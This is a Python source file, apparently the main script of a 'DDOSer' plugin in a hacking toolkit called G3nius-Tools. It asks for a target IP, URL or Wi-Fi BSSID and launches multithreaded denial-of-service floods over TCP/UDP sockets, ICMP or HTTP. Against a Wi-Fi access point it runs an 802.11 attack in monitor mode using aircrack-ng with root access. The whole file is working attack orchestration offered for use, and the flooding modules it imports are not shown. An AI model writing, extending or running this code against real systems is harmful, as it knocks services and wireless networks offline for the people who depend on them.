# import G3nius-Tools
# coding: utf-8

# Error handlers
from lib.core.Error_Handler import Handler
import lib.config.Error_Levels as Error_Levels
import plugins.DDOSer.Status_Holders as Holders
try:
    """		libs		"""
    # external
    from threading import Thread

    # internal
    from lib.core.End_Plugin import End_Plugin
    from lib.GPL.String_Workers import gpl_JSON_loads
    from lib.GPL.Page_Managers import gpl_set_banner_verion
    from lib.core.Check_Supported_OS import Check_Supported
    from lib.GPL.Access_Managers import gpl_check_root_needed_with_error
    from lib.GPL.IO import gpl_input, gpl_while_input, gpl_sleep, gpl_confirm
    from lib.GPL.attackers.signals.IEEE_802_11_WiFi.Check_Requirements import gpl_wifi_check_requirements
    from lib.GPL.attackers.signals.IEEE_802_11_WiFi.Monning import gpl_wifi_monning_on, gpl_wifi_monning_off
    from lib.GPL.attackers.signals.IEEE_802_11_WiFi.Channel import gpl_wifi_set_channel

    # plugin
    from plugins.DDOSer.HTTP_Attacker import HTTP_Attacker
    from plugins.DDOSer.ICMP_Attacker import ICMP_Attacker
    from plugins.DDOSer.Socket_Attacker import SOCKET_Attacker
    from plugins.DDOSer.WiFi_Attacker import IEEE_802_11_Attacker


    """     set version     """
    gpl_set_banner_verion('2.0.0')

    """     functions       """
    def Get_JSON(Title):
        while True:
            Data = gpl_input(Title)
            Data = gpl_JSON_loads(Data)
            if Data == None:
                Handler(Error_Levels.Failed_Job, "It's not a valid JSON format!")
                gpl_sleep()
            else:
                return Data

    """     attackers       """
    Holders.Create_Holders()
    # get info
    # type
    Type = gpl_while_input('Choose target type:', ['SOCKET (TCP / UDP)', 'ICMP', 'HTTP / HTTPS', 'Wi-Fi / AccessPoint'])
    # threads
    while True:
        Thread_Numbers = gpl_input("Enter number of Threads: ", get_int=True)
        if Thread_Numbers <= 0:
            Handler(Error_Levels.Failed_Job, "Numbers of Threads can't be <= 0")
            gpl_sleep()
        else:
            break
    # sleep
    while True:
        Sleep_Time = gpl_input("Enter number of Sleep time (Sec): ", get_float=True)
        if Sleep_Time < 0:
            Handler(Error_Levels.Failed_Job, "Numbers of sleep time can't be lower than 0!")
            gpl_sleep()
        else:
            break


    if Type == 1:
        # SOCKET
        # IP
        IP = gpl_input('Enter Target IP: ', get_ip=True)
        # Port
        Port = gpl_input('Enter port number: ', get_port=True)
        # Protocol
        Protocol = gpl_while_input('Choose target type:', ['TCP SOCKET', 'UDP SOCKET'])
        # Attack type
        Method = gpl_while_input('Choose type of DDOS:', ['Connect and close to target.', 'Send data on socket session.'])
        # Data
        if Method == 2:
            Data = gpl_input('Enter data to send on socket: ').encode()
        else:
            Data = ''
        # Attack
        for i in range(0, Thread_Numbers):
            thread = Thread(target=SOCKET_Attacker, args=(IP, Port, Protocol, Method, Sleep_Time, Data,))
            thread.start()
        # Stop
        Handler(Error_Levels.Info, 'Attack Started, Press CTRL+C to stop attack.')
        while True:
            try:
                input()
            except (EOFError, KeyboardInterrupt):
                Holders.In_Attack = False
            Handler(Error_Levels.Info, 'Stopping attack, Please wait...')



    elif Type == 2:
        # ICMP
        IP = gpl_input('Target IP: ', get_ip=True)
        while True:
            Packet_Size = gpl_input("Packet size number (Normal: 64) : ", get_int=True)
            if Packet_Size <= 0:
                Handler(Error_Levels.Failed_Job, "Packet size number can't be <= 0")
                gpl_sleep()
            else:
                break
        # Running Threads
        for i in range(0, Thread_Numbers):
            attacker = Thread(target=ICMP_Attacker, args=(IP, Packet_Size,))
            attacker.start()




    elif Type == 3:
        # HTTP/HTTPS
        URL = gpl_input('Enter target URL: ', get_URL=True)
        #Methods
        Methods = ['GET', 'POST']
        Method = gpl_while_input('Choose method:', Methods)
        if gpl_confirm('Do you want use custom Headers, Cookies, and etc..', False):
            # Headers
            Headers = Get_JSON('Enter custom headers as JSON format : ')
            # Cookies
            Cookies = Get_JSON('Enter custom cookies as JSON format : ')
            # Payload
            Payload = Get_JSON('Enter custom payload as JSON format : ')
            # Attacker Thread
            for i in range(0, Thread_Numbers):
                attacker = Thread(target=HTTP_Attacker, args=(URL, Methods[Method - 1], Sleep_Time, Payload, Cookies, Headers,))
                attacker.start()
        else:
            for i in range(0, Thread_Numbers):
                attacker = Thread(target=HTTP_Attacker, args=(URL, Methods[Method - 1], Sleep_Time,))
                attacker.start()
        # Stop
        Handler(Error_Levels.Info, 'Attack Started, Press CTRL+C to stop attack.')
        while True:
            try:
                input()
            except (EOFError, KeyboardInterrupt):
                Holders.In_Attack = False
                Handler(Error_Levels.Info, 'Stopping attack, Please wait...')
                break



    else:
        # Wi-Fi/AP
        # checking
        if not Check_Supported(Linux=True):
            Handler(Error_Levels.High, "Can't do DOS-DDOS on IEEE 802.11 signals.", 'Only Linux systems can do attack.')
            End_Plugin()
        if not gpl_wifi_check_requirements():
            Handler(Error_Levels.High, "Install 'aircrack-ng' and 'net-tools' with your package manager.")
            End_Plugin()
        gpl_check_root_needed_with_error(description='This plugin need root access. Run as Root.')
        # ask BSSID
        BSSID = gpl_input("Enter BSSID of target AP: ", get_MAC=True)
        Channel = gpl_input("Enter channel of target AP: ", get_int=True)
        # Monning
        Handler(Error_Levels.Info, "Monning interface...", "May be disconnected, It's normally.")
        if gpl_wifi_monning_on():
            Handler(Error_Levels.Alert, "Interface monning was successfully.")
            # set channel
            gpl_wifi_set_channel(Channel)
            # Attack
            Handler(Error_Levels.Alert, "Attack started successfully.", 'Use CTRL+C once, to stop attack.')
            while True:
                try:
                    IEEE_802_11_Attacker(BSSID, Thread_Numbers)
                except (EOFError, KeyboardInterrupt):
                    break
                else:
                    gpl_sleep(Sleep_Time)
            Handler(Error_Levels.Info, "Attack stoping.")
            # Unmonning
            Handler(Error_Levels.Info, "Interface unmonning...")
            if gpl_wifi_monning_off():
                 Handler(Error_Levels.Alert, "Interface unmonning was successfully.")
            else:
                Handler(Error_Levels.Failed_Job, "Failed to umonning interface.", "If can't connect to other Wi-Fis, Reboot your OS.")
        else:
            Handler(Error_Levels.Failed_Job, "Interface monning was failed. Fixing Monning...")
            gpl_wifi_monning_off()
            Handler(Error_Levels.High, "Unmonned done ok. Failed to monning interface!", "Please report this to support E-Mail.")

except (EOFError, KeyboardInterrupt):
    Handler(Error_Levels.Failed_Job, "Exit with user request.")